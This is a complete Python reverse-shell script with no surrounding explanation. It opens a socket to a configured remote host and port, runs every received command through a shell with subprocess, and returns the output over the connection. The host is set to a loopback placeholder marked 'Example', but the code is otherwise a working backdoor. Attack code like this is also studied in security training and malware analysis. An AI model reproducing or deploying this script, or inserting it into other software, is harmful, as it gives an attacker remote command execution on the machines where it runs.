#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess


class Config:
    RHOST = "127.0.0.1"  # Example
    RPORT = 8080  # Example


def main() -> None:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((Config.RHOST, Config.RPORT))
        except ConnectionRefusedError:
            ...
        else:
            while True:
                comm = s.recv(1024)
                if not comm:
                    break
                proc = subprocess.Popen(
                    comm,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                )
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output)


if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        exit(0)
